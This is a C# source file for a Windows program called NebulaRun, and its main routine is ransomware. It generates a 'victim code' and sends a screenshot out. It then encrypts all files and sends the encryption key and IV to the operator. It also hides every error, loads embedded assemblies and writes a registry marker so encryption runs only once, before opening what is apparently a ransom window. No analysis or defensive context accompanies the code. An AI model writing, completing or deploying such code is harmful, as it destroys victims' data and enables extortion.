using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NebulaRun
{
internal static class Program
{
    private const string RegKeyPath = @"Software\NebulaRun";
    private const string RegValueName = "Marked";
    private const string RegValueData = "1";

	[STAThread]
	private static void Main()
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

		bool createdNew;
		using (Mutex mutex = new Mutex(true, "NB111", out createdNew))
		{
			if (!createdNew)
			{
				return;
			}

			try
			{
				AppDomain.CurrentDomain.UnhandledException += delegate(object sender, UnhandledExceptionEventArgs e)
				{
				};
				Application.ThreadException += delegate(object sender, System.Threading.ThreadExceptionEventArgs e)
				{
				};

				AppDomain.CurrentDomain.AssemblyResolve += delegate(object sender, ResolveEventArgs args)
				{
					try
					{
						string name = "NebulaRun." + new AssemblyName(args.Name).Name + ".dll";
						using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
						{
							if (stream == null)
							{
								return null;
							}
							byte[] array = new byte[stream.Length];
							stream.Read(array, 0, array.Length);
							return Assembly.Load(array);
						}
					}
					catch
					{
						return null;
					}
				};

				Nbl.GenerateVictimCode();

				bool alreadyMarked = false;
				try
				{
					using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKeyPath))
					{
						if (key != null && key.GetValue(RegValueName) != null)
						{
							alreadyMarked = true;
						}
					}
				}
				catch
				{
				}

				if (!alreadyMarked)
				{
					try
					{
						Send.SendScreenshotAsync(Nbl.VictimCode);
						Task.Delay(4000).Wait();
						Nbl.EncryptAll();
						Task.Delay(4000).Wait();
						Send.SendKeyAndIvAsync(Nbl.GetBase64Key(), Nbl.GetBase64IV(), Nbl.VictimCode);
					}
					catch
					{
					}

					try
					{
						using (RegistryKey key = Registry.CurrentUser.CreateSubKey(RegKeyPath))
						{
							if (key != null)
							{
								key.SetValue(RegValueName, RegValueData, RegistryValueKind.String);
							}
						}
					}
					catch
					{
					}
				}

				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Nbl());
			}
			catch
			{
			}
		}
	}
}
}
